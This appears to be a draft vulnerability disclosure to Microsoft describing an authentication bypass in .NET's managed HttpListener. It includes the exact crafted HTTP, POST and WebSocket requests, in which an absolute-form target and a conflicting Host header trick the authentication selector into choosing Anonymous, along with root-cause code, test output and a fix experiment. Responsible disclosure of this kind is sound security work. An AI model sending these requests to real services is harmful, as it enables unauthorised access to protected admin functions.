# MSRC draft — managed HttpListener absolute-form authority confusion bypasses per-request authentication

## Suggested title

Managed HttpListener absolute-form authority confusion lets an unauthenticated client reach a Basic-protected listener as Anonymous

## Summary

The managed HttpListener implementation used on Linux and macOS can expose conflicting authorities for a single
HTTP/1.1 absolute-form request.

For:

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

managed HttpListener exposes:

```text
Request.Url.Host     = admin.test
Request.UserHostName = public.test:<port>
```

This split occurs before two framework-owned decisions:

1. HttpListener prefix routing uses `Request.Url` and selects the `admin.test` HttpListener.
2. That admin listener's `AuthenticationSchemeSelectorDelegate` receives the same request. If it uses the
   Microsoft-documented `UserHostName` property to select per-host authentication, it sees `public.test` and can
   select `Anonymous`.

The result is that an unauthenticated remote client is delivered an anonymous `HttpListenerContext` from the
Basic-protected admin listener.

The same ordinary request to `admin.test` selects Basic, receives `401 Unauthorized` plus
`WWW-Authenticate: Basic`, and is not delivered as a context.

Windows/http.sys canonicalizes the conflicting absolute-form request to the request-target authority before the
selector runs, so the identical control remains protected.

## Attack preconditions

The proof sends the request directly over a TCP socket to HttpListener. No forward proxy, reverse proxy, browser,
DNS rebinding, or intermediary parser is required for the vulnerable interpretation.

The attacker needs network reachability to an affected managed HttpListener endpoint and the application must use the
documented per-request authentication selector in a host-dependent configuration. The public and admin authorities may
resolve to the same server address, as in ordinary name-based virtual hosting.

## Security invariant

A single accepted request must not use one authority to choose the target HttpListener and a different authority to
choose the authentication policy protecting that HttpListener.

RFC 9112 section 3.2.2 requires an origin server receiving absolute-form to ignore the received Host field and use the
authority from the request-target.

## Confirmed affected releases

Researcher-controlled end-to-end proof:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528291290

Confirmed vulnerable:

- .NET 8.0.31 / Ubuntu 24.04.5
- .NET 9.0.20 / Ubuntu 24.04.5
- .NET 10.0.12 / Ubuntu 24.04.5
- .NET 10.0.12 / macOS 15.7.9
- .NET 11.0.0-rc.1.26425.128 / Ubuntu 24.04.5
- .NET 11.0.0-rc.1.26425.128 / macOS 15.7.9

Negative controls:

- .NET 10.0.12 / Windows 2025 / http.sys — 401 Basic, no admin context delivered
- .NET 11.0.0-rc.1.26425.128 / Windows 2025 / http.sys — 401 Basic, no admin context delivered

.NET 11 RC1 is a current go-live release candidate and is explicitly in scope under the .NET bounty program.

RC1 matrix:
https://github.com/SamCloudJourney/basic-website/actions/runs/35529474195

Validated current runtime source commit:

`12921b1d8c6865a774232de9379133020ad23d79`

## Two independent end-to-end proof shapes

I validated the same root cause through two independent configurations.

### A. Microsoft-documented selector model

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528996700

A single HttpListener instance owns both exact prefixes:

```text
http://public.test:<port>/
http://admin.test:<port>/
```

Its `AuthenticationSchemeSelectorDelegate` uses `UserHostName`, which Microsoft's
`AuthenticationSchemes` documentation explicitly identifies as a supported request characteristic for choosing
different authentication mechanisms.

Results:

```text
ordinary public:
  UserHostName=public.test
  Url.Host=public.test
  selected=Anonymous
  200, context delivered

ordinary admin:
  UserHostName=admin.test
  Url.Host=admin.test
  selected=Basic
  401 + WWW-Authenticate: Basic
  no context delivered

absolute admin + Host public on Linux/macOS:
  UserHostName=public.test
  Url.Host=admin.test
  selected=Anonymous
  200
  anonymous context delivered for admin authority

same request on Windows/http.sys:
  UserHostName=admin.test
  Url.Host=admin.test
  selected=Basic
  401 + Basic challenge
  no context delivered
```

This is the closest reproduction to Microsoft's documented per-request authentication model.

### B. Framework-owned prefix-routing model

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35528291290

Two different HttpListener instances own the public and admin prefixes. Managed HttpListener's own
`HttpEndPointListener.SearchListener(Request.Url)` routes the conflicting absolute-form request to the ADMIN listener.
That admin listener's authentication selector then sees the stale public `UserHostName` and selects Anonymous.

This removes custom application routing from the security chain.

## Proof configuration

Synthetic DNS names are mapped to loopback in the researcher-controlled test environment.

```csharp
publicListener.Prefixes.Add($"http://public.test:{port}/");
adminListener.Prefixes.Add($"http://admin.test:{port}/");

publicListener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;

adminListener.AuthenticationSchemeSelectorDelegate = request =>
{
    string hostOnly = request.UserHostName.Split(':')[0];

    return hostOnly == "public.test"
        ? AuthenticationSchemes.Anonymous
        : AuthenticationSchemes.Basic;
};
```

This is intentionally minimal. There is no custom application router deciding whether the request is public or admin.
HttpListener's own prefix routing chooses the listener.

## Control: public authority

```http
GET / HTTP/1.1
Host: public.test:<port>
Connection: close
```

```text
HTTP/1.1 200 OK
publicContext=True
adminContext=False
basicChallenge=False
adminSentinel=False
```

## Control: protected admin authority

```http
GET / HTTP/1.1
Host: admin.test:<port>
Connection: close
```

```text
selector UserHostName=admin.test:<port>
selector Url.Host=admin.test
selected=Basic

HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic ...
publicContext=False
adminContext=False
adminSentinel=False
```

The framework does not return an unauthenticated admin context.

## Attack

```http
GET http://admin.test:<port>/ HTTP/1.1
Host: public.test:<port>
Connection: close
```

Managed .NET 10 Linux:

```text
SELECTOR listener=ADMIN
UserHostName=public.test:<port>
Url.Host=admin.test
Selected=Anonymous

ADMIN_CONTEXT
UserHostName=public.test:<port>
Url.Host=admin.test
User=ANONYMOUS

HTTP/1.1 200 OK
basicChallenge=False
publicContext=False
adminContext=True
adminSentinel=True

FRAMEWORK_PREFIX_ROUTING_AUTH_BYPASS=CONFIRMED
```

The returned sentinel represents a researcher-controlled protected admin action.

## Windows negative control

Identical test model and request:

```text
SELECTOR listener=ADMIN
UserHostName=admin.test:<port>
Url.Host=admin.test
Selected=Basic

HTTP/1.1 401 Unauthorized
basicChallenge=True
publicContext=False
adminContext=False
adminSentinel=False

FRAMEWORK_PREFIX_WINDOWS_NEGATIVE_CONTROL=PASS
```

## Root cause

In managed `HttpListenerRequest.FinishInitialization()`:

```csharp
ReadOnlySpan<char> host = UserHostName;
...
if (raw_uri != null)
    host = raw_uri.Host;
```

The local `host` variable is updated for constructing `Request.Url`, but the public property remains backed by the
received Host header:

```csharp
public string UserHostName => Headers[HttpKnownHeaderNames.Host]!;
```

Managed listener routing then uses the canonical URI:

```csharp
HttpListener? listener = SearchListener(req.Url, out prefix);
...
string host = uri.Host;
...
if (p.Host != host || p.Port != port)
    continue;
...
bestMatch = localPrefixes[p];
```

Authentication is then selected on that chosen listener:

```csharp
context.AuthenticationSchemes =
    context._listener!.SelectAuthenticationScheme(context);
```

and:

```csharp
return AuthenticationSchemeSelectorDelegate != null
    ? AuthenticationSchemeSelectorDelegate(context.Request)
    : _authenticationScheme;
```

Thus the target listener is selected from one authority while its authentication callback can observe another.

## Causal remediation experiment

A minimal research patch canonicalizes the Host-facing state when absolute-form is accepted:

```diff
 if (raw_uri != null)
-    host = raw_uri.Host;
+{
+    host = raw_uri.Host;
+    Headers.Set(HttpKnownHeaderNames.Host, raw_uri.Authority);
+}
```

The current-main regression is structured to require:

- vulnerable source: conflicting request reaches the admin path anonymously;
- patched source: same bytes select Basic, return 401 + Basic challenge, and no context is delivered;
- public origin-form control remains Anonymous / 200;
- ordinary admin origin-form control remains Basic / 401.

## Microsoft documentation

AuthenticationSchemeSelectorDelegate:
https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemeselectordelegate

AuthenticationSchemes:
https://learn.microsoft.com/dotnet/api/system.net.httplistener.authenticationschemes

Microsoft documents the selector for choosing different authentication mechanisms from request characteristics, and
the AuthenticationSchemes documentation specifically includes `Url` and `UserHostName` as examples.

## RFC reference

RFC 9112 section 3.2.2:
https://www.rfc-editor.org/rfc/rfc9112.html#section-3.2.2

The RFC requires an origin server receiving an absolute-form request-target to ignore the received Host field and use
the request-target authority. It also requires servers to accept absolute-form.

## Security impact

Demonstrated consequence: authentication/security-feature bypass.

An unauthenticated network client can cause the managed HttpListener to route a request to a listener identified by
the absolute-form target authority while that listener's per-request authentication selector evaluates a conflicting
Host-derived authority and selects Anonymous.

The proof demonstrates a protected admin listener that:

- returns 401 Basic for the ordinary unauthenticated admin request;
- returns an anonymous admin context for the conflicting absolute-form request; and
- executes a synthetic protected admin action.

No claim is made that every HttpListener application is affected. Exploitation requires an application to use
`AuthenticationSchemeSelectorDelegate` with request authority characteristics in a way supported by Microsoft's
documented API model.

## Suggested classification

- Security Feature Bypass / Authentication Bypass
- Authority canonicalization / inconsistent HTTP request interpretation
- Potential CWE mapping: CWE-444 (inconsistent interpretation of HTTP requests) with authentication-bypass consequence

## Research scope

All listeners, hosts, ports, credentials, response bodies, and actions are synthetic and researcher-controlled.
Testing used repository source and local GitHub Actions runners only.


## Combined high-impact terminal: exact admin prefix + WebSocket + privileged operation

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35531404399

A separate researcher-controlled proof combines all demonstrated boundaries into a single chain.

Framework configuration:

```text
PUBLIC listener:
  http://public.test:<port>/

ADMIN listener:
  http://admin.test:<port>/admin/ws/

ADMIN AuthenticationSchemeSelectorDelegate:
  public.test -> Anonymous
  admin.test  -> Basic
```

Ordinary unauthenticated protected admin WebSocket request:

```http
GET /admin/ws/control HTTP/1.1
Host: admin.test:<port>
Upgrade: websocket
Connection: Upgrade
...
```

Result:

```text
Selected=Basic
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic ...
adminContext=False
wsUpgrade=False
commandExecuted=False
sideEffectCreated=False
```

Attack:

```http
GET http://admin.test:<port>/admin/ws/control HTTP/1.1
Host: public.test:<port>
Upgrade: websocket
Connection: Upgrade
...
```

Managed Linux/macOS result:

```text
HttpListener exact prefix routing:
  publicContext=False
  adminContext=True

selector:
  UserHostName=public.test:<port>
  Url.Host=admin.test
  Selected=Anonymous

wire:
  HTTP/1.1 101 Switching Protocols
  Basic challenge=False

client sends masked WebSocket command:
  EXECUTE_SYNTHETIC_ADMIN_CHANGE

ADMIN listener receives command
protected operation executes
researcher-controlled temp-file side effect is created

ULTIMATE_FRAMEWORK_ROUTING_AUTH_WEBSOCKET_COMMAND_BYPASS=CONFIRMED
```

Confirmed on:

- .NET 8.0.31 / Linux
- .NET 9.0.20 / Linux
- .NET 10.0.12 / Linux
- .NET 10.0.12 / macOS
- .NET 11.0.0-rc.1 / Linux
- .NET 11.0.0-rc.1 / macOS

Windows/http.sys negative controls on .NET 10 and .NET 11 RC1 both remain:

```text
Selected=Basic
401 Unauthorized
adminContext=False
wsUpgrade=False
commandExecuted=False
sideEffectCreated=False

ULTIMATE_WINDOWS_NEGATIVE_CONTROL=PASS
```

The operation is deliberately synthetic and writes only to the runner's temporary directory. This demonstrates
integrity impact after the authentication boundary is crossed; it is not a claim of arbitrary code execution.

The same root cause therefore supports all of the following researcher-controlled terminals:

1. protected admin context returned anonymously;
2. protected state-changing HTTP POST executed;
3. protected admin WebSocket upgraded to 101 without Basic authentication;
4. bidirectional privileged command accepted over that WebSocket;
5. concrete filesystem side effect from the synthetic protected operation.


## Credential-validation bypass terminal

Clean run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35531683745

This proof specifically addresses the fact that managed HttpListener Basic authentication surfaces the supplied Basic
identity/password to application code.

A separate researcher-controlled credential-validation layer is added after HttpListener returns a Basic context:

```text
expected username: research-admin
expected password: correct-research-password
```

The protected admin operation is executed only after that validation succeeds for a Basic identity. Anonymous public
requests intentionally do not enter the Basic credential-validation path because the framework selector classifies
them as public.

Controls:

```text
PUBLIC_CONTROL
  Selected=Anonymous
  200 OK
  credentialValidationRan=False
  adminOperation=False

ADMIN_NO_CREDENTIALS
  Selected=Basic
  401 Unauthorized
  Basic challenge=True
  context=False
  adminOperation=False

ADMIN_WRONG_CREDENTIALS
  Selected=Basic
  context=True
  credentialValidationRan=True
  credentialValidationPassed=False
  403 Forbidden
  adminOperation=False
  sideEffect=False

ADMIN_CORRECT_CREDENTIALS
  Selected=Basic
  credentialValidationRan=True
  credentialValidationPassed=True
  200 OK
  adminOperation=True
  sideEffect=True
```

Attack, with **no Authorization header**:

```http
POST http://admin.test:<port>/admin/change HTTP/1.1
Host: public.test:<port>
Content-Length: 0
Connection: close
```

Managed result:

```text
Selected=Anonymous
selectorUserHost=public.test:<port>
selectorUrlHost=admin.test
HTTP/1.1 200 OK
context=True
userNull=True
credentialValidationRan=False
credentialValidationPassed=False
adminOperation=True
sideEffect=True

HOST_AUTHORITY_CONFUSION_BYPASSES_CREDENTIAL_VALIDATION=CONFIRMED
```

Thus the no-credential attack executes an operation that deliberately supplied **wrong Basic credentials cannot
execute**.

This is confirmed on:

- .NET 8.0.31 / Linux
- .NET 9.0.20 / Linux
- .NET 10.0.12 / Linux
- .NET 10.0.12 / macOS
- .NET 11.0.0-rc.1 / Linux
- .NET 11.0.0-rc.1 / macOS

Windows/http.sys on both .NET 10 and .NET 11 RC1 canonicalizes the conflict first:

```text
Selected=Basic
401 Unauthorized
context=False
adminOperation=False
sideEffect=False

CREDENTIAL_VALIDATION_WINDOWS_NEGATIVE_CONTROL=PASS
```

This terminal demonstrates that the authority confusion can bypass not only the framework's Basic challenge but also
an application credential-validation stage that wrong credentials fail and correct credentials pass.

The proof remains deliberately synthetic: the protected operation creates only a marker in the runner's temporary
directory.


## Causal current-main fix proof — hostname authority

Clean current-main run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35530783238

Validated source commit:

`12921b1d8c6865a774232de9379133020ad23d79`

Unpatched source:

```text
CURRENT_MAIN_AUTHORITY_CONFUSION=CONFIRMED
CURRENT_MAIN_PUBLIC_CONTROL=PASS
CURRENT_MAIN_ADMIN_BASIC_CONTROL=PASS
CURRENT_MAIN_AUTH_SCHEME_FULL_WIRE_BYPASS=CONFIRMED
```

A minimal managed-source experiment canonicalizes the Host-facing value to the absolute-form authority and rebuilds the
actual `System.Net.HttpListener` product assembly before rerunning the same security regression.

Patched-source result:

```text
EXPERIMENTAL_GUARD_PUBLIC_CONTROL=PASS
EXPERIMENTAL_GUARD_ADMIN_CONTROL=PASS
EXPERIMENTAL_GUARD_SELECTOR UserHostName=admin.test:<port> Url.Host=admin.test Selected=Basic
EXPERIMENTAL_AUTHORITY_CANONICALIZATION_GUARD=BLOCKS_BYPASS
```

So the hostname-authority bypass is causally removed while both public and admin controls remain unchanged.

## Cross-port authority variant — affects Windows/http.sys too

A second, stronger sibling variant uses the **same hostname on two ports**:

```text
PUBLIC listener: http://app.test:<publicPort>/public/
ADMIN listener:  http://app.test:<adminPort>/admin/
```

The attacker connects directly to the ADMIN port but sends an absolute-form target naming the PUBLIC port:

```http
POST http://app.test:<publicPort>/admin/change HTTP/1.1
Host: app.test:<publicPort>
Content-Length: 0
Connection: close
```

HttpListener exposes:

```text
UserHostName / Host-facing authority = app.test:<publicPort>
Request.Url.Authority               = app.test:<adminPort>
```

The admin listener's selector therefore selects Anonymous from the public port while framework routing remains bound to
the admin socket/listener. The protected admin operation executes and creates the synthetic side effect.

Clean cross-platform run:

https://github.com/SamCloudJourney/basic-website/actions/runs/35532123773

Confirmed:

- .NET 8.0.31 Linux
- .NET 8.0.31 Windows/http.sys
- .NET 9.0.20 Linux
- .NET 9.0.20 Windows/http.sys
- .NET 10.0.12 Linux
- .NET 10.0.12 macOS
- .NET 10.0.12 Windows/http.sys
- .NET 11.0.0-rc.1 Linux
- .NET 11.0.0-rc.1 macOS
- .NET 11.0.0-rc.1 Windows/http.sys

Representative Windows .NET 10 result:

```text
ADMIN_CONTROL:
  UserHostName=app.test:<adminPort>
  UrlAuthority=app.test:<adminPort>
  Selected=Basic
  401 Unauthorized
  sideEffect=False

ABSOLUTE_PUBLIC_PORT_TO_ADMIN_SOCKET:
  connectPort=<adminPort>
  UserHostName=app.test:<publicPort>
  UrlAuthority=app.test:<adminPort>
  Selected=Anonymous
  200 OK
  adminContext=True
  sideEffect=True

CROSS_PORT_FRAMEWORK_AUTH_BYPASS=CONFIRMED
```

This broadens the root cause from a managed-only hostname discrepancy to a more general **absolute-form authority
inconsistency**: host and port components can be sourced from different places, and the port variant reproduces on
Windows/http.sys as well.

Important remediation implication: the three-line managed Host canonicalization experiment closes the hostname variant,
but a complete product fix must canonicalize the **entire authority (host + port)** consistently for request properties,
listener/resource routing, and authentication selection, or reject inconsistent absolute-form authority when it cannot
be represented consistently.
